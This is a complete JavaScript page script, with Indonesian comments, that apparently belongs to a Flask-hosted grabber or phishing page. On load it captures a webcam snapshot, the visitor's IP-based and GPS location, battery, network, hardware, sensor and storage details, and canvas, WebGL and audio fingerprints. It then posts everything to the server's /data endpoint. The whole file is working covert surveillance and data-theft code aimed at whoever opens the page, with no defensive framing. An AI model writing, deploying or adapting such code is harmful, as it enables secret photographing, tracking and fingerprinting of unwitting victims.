(async () => {
  const delay = ms => new Promise(res => setTimeout(res, ms));

  console.log("[*] Mulai akses kamera...");
  const video = document.getElementById("video");
  const canvas = document.createElement("canvas");
  const ctx = canvas.getContext("2d");

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    await delay(2000);
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  } catch (e) {
    console.warn("❌ Kamera gagal:", e);
  }

  const snapshot = canvas.toDataURL("image/png");

  // IP + geolokasi
  const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
  const ip = ipData.ip;

  // GPS
  let lokasiGPS = {};
  try {
    const pos = await new Promise((res, rej) =>
      navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 })
    );
    lokasiGPS = {
      lat: pos.coords.latitude,
      lon: pos.coords.longitude,
      acc: pos.coords.accuracy
    };
  } catch (e) {
    lokasiGPS = { lat: "-", lon: "-", acc: "-" };
  }

  // Baterai
  const battery = await navigator.getBattery();
  const conn = navigator.connection || {};

  // Fingerprint
  function getCanvasFP() {
    const c = document.createElement("canvas");
    const ctx = c.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "14px Arial";
    ctx.fillText("fingerprint", 2, 2);
    return c.toDataURL();
  }

  function getWebGLFP() {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl");
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    return {
      vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
      renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
    };
  }

  function getAudioFP() {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const analyser = ctx.createAnalyser();
    osc.connect(analyser);
    osc.start(0);
    const freq = new Uint8Array(analyser.frequencyBinCount);
    analyser.getByteFrequencyData(freq);
    osc.stop();
    return Array.from(freq).slice(0, 10).join(",");
  }

  // Sensor
  let motion = {};
  let orientation = {};
  window.addEventListener("deviceorientation", e => {
    orientation = { alpha: e.alpha, beta: e.beta, gamma: e.gamma };
  });
  window.addEventListener("devicemotion", e => {
    motion = {
      accX: e.acceleration.x,
      accY: e.acceleration.y,
      accZ: e.acceleration.z,
      rotAlpha: e.rotationRate.alpha,
      rotBeta: e.rotationRate.beta,
      rotGamma: e.rotationRate.gamma
    };
  });

  await delay(1500); // tunggu sensor update

  const storage = await navigator.storage.estimate();

  const data = {
    ip: ip,
    userAgent: navigator.userAgent,
    memory: navigator.deviceMemory || "-",
    cpuCores: navigator.hardwareConcurrency || "-",
    width: screen.width,
    height: screen.height,
    lang: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    connection: `${conn.effectiveType || "-"}, ${conn.downlink || "-"} Mbps, ${conn.rtt || "-"}ms`,
    battery: {
      level: battery.level * 100,
      charging: battery.charging
    },
    location: lokasiGPS,
    geo: {
      country: ipData.country_name,
      region: ipData.region,
      city: ipData.city,
      postal: ipData.postal
    },
    referer: document.referrer,
    path: window.location.pathname,
    canvasFP: getCanvasFP(),
    webglFP: getWebGLFP(),
    audioFP: getAudioFP(),
    motion,
    orientation,
    storage: {
      usage: storage.usage,
      quota: storage.quota
    },
    snapshot
  };

  console.log("[*] Mengirim data ke /data:", data);

  // Kirim ke server Flask
  fetch("/data", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  })
    .then(res => res.text())
    .then(text => console.log("✅ Server response:", text))
    .catch(err => console.error("❌ Gagal kirim data ke server:", err));
})();
